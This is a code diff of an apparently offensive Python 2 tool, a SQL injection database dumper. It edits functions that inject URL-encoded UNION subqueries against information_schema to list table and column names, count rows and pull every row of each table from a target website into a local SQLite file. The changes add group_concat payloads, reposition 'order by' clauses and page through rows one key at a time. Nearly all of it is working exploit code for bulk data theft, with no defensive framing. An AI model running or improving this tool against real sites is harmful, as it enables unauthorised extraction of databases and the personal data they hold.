@@ -1,9 +1,11 @@
 import os
 import sqlite3
 import urllib2
+import urllib
 import urlparse
 import time
 import BeautifulSoup
+import re
 
 from termcolor import colored, cprint
 
@@ -89,8 +91,10 @@ class DBDump:
 
 	def getTableNames(self, varsql, dbname):
 		tbl_names = []
-		httpsql = varsql.replace("'[XX]'", "concat('" + self.start_tag + "',table_name,'" + self.finish_tag + "')");
-		httpsql += "%20FROM%20information_schema.tables%20WHERE%20table_schema='" + dbname + "'"
+		httpsql = varsql.replace("'[XX]'", "(select%20group_concat(%27" + self.start_tag + "%27,table_name,%27" + self.finish_tag + "%27)%20FROM%20information_schema.tables%20WHERE%20table_schema=%27" + dbname + "%27)");
+		if "order%20by" in httpsql:
+			httpsql = httpsql.replace("%20order%20by%20%271", "")
+			httpsql += "%20order%20by%20%271"
 		content = urllib2.urlopen(httpsql).read()
 		for item in content.split("</tag>"):
 			if "" + self.start_tag + "" in item: 
@@ -100,8 +104,10 @@ class DBDump:
 
 	def getColumnNames(self, varsql, dbname, tblname):
 		col_names = []
-		httpsql = varsql.replace("'[XX]'", "concat('" + self.start_tag + "',concat(column_name,'|',column_type),'" + self.finish_tag + "')");
-		httpsql += "%20FROM%20information_schema.columns%20WHERE%20table_schema='" + dbname + "'%20and%20table_name='" + tblname + "'"
+		httpsql = varsql.replace("'[XX]'", "(select%20group_concat(%27" + self.start_tag + "%27,concat(column_name,%27|%27,column_type),%27" + self.finish_tag + "%27)%20FROM%20information_schema.columns%20WHERE%20table_schema=%27" + dbname + "%27%20and%20table_name=%27" + tblname + "%27)");
+		if "order%20by" in httpsql:
+			httpsql = httpsql.replace("%20order%20by%20%271", "")
+			httpsql += "%20order%20by%20%271"
 		content = urllib2.urlopen(httpsql).read()
 		for item in content.split("</tag>"):
 			if "" + self.start_tag + "" in item: 
@@ -147,7 +153,8 @@ class DBDump:
 			self.conn.execute(createsql)
 
 	def getNumRows(self, varsql, tblname):
-		httpsql = varsql.replace("'[XX]'", "concat('" + self.start_tag + "',count(*),'" + self.finish_tag + "')");
+		#httpsql = varsql.replace("'[XX]'", "concat('" + self.start_tag + "',count(*),'" + self.finish_tag + "')");
+		httpsql = varsql.replace("'[XX]'", "concat('<tag>',(select%20count(*)%20from%20" + tblname + "),'</tag>')");
 		httpsql += "%20FROM%20" + tblname
 		return self.sqlRequest(httpsql)
 
@@ -165,28 +172,36 @@ class DBDump:
 		for tblname, strcolnames in iter(tbl_overview.iteritems()):
 			print colored("[+] [{1}] Dumping Table: {0}".format(tblname, func.showTime()), "cyan")
 			columns = strcolnames.split("||")
-			start_con = "concat('" + self.start_tag + "',"
+			start_con = "concat('<tag>',(select%20concat("
 			concat = start_con
+			firstcol = None
+			newcols = []
 			for column in columns:
-				rows = column.split("|")
-				row = rows[0]
-				if concat != start_con and len(row) > 0:
-					concat += ",'|',"
-				concat += row
-			concat += ",'" + self.finish_tag + "')"
+				splitcols = column.split("|")
+				if splitcols[0]:
+					newcols.append(splitcols[0])
+			firstcol = newcols[0];
+			concat += ",'|||',".join(newcols)
+			concat += ")%20from%20" + tblname + "%20[LIMIT]),'<\/tag>')"
 			numrows = self.getNumRows(varsql, tblname)
 			httpsql = varsql.replace("'[XX]'", concat);
-			httpsql += "%20FROM%20" + tblname
+			if "order%20by" in httpsql:
+				httpsql = httpsql.replace("%20order%20by%20%271", "")
+				httpsql += "%20order%20by%20%271"
+			lastins = 0
+			#print "Rows: {0}".format(numrows)
 			for x in range(1, (int(numrows)+1)):
-				rangesql = httpsql + "%20LIMIT%20" + str(x) + ",1"
+				rangesql = httpsql.replace("[LIMIT]", "%20where%20" + firstcol + "%20>%20" + str(lastins) + "%20order%20by%20" + firstcol + "%20asc%20LIMIT%201")
+				#print rangesql
 				content = urllib2.urlopen(rangesql).read()
 				for item in content.split("</tag>"):
 					if "" + self.start_tag + "" in item: 
 						retval = item [ item.find("" + self.start_tag + "")+len("" + self.start_tag + "") : ]
-						items = retval.split("|")
+						items = retval.split("|||")
 						db_size = os.stat(self.db_file).st_size 
 						addstartsql = "INSERT INTO " + tblname + " VALUES ("
 						addsql = addstartsql
+						lastins = items[0]
 						for data in items:
 							if addstartsql <> addsql:
 								addsql += ","
@@ -194,9 +209,9 @@ class DBDump:
 						addsql += ");"
 						#print addsql
 						cursor.execute(addsql)
-
 						# 2GB = 2000000000
 						if db_size > 2000000000 and size_alert == False:
 							print colored("[+] [{1}] WARNING: Local database file is over 2GB", "red")
 							size_alert = True
+
 		self.conn.commit()
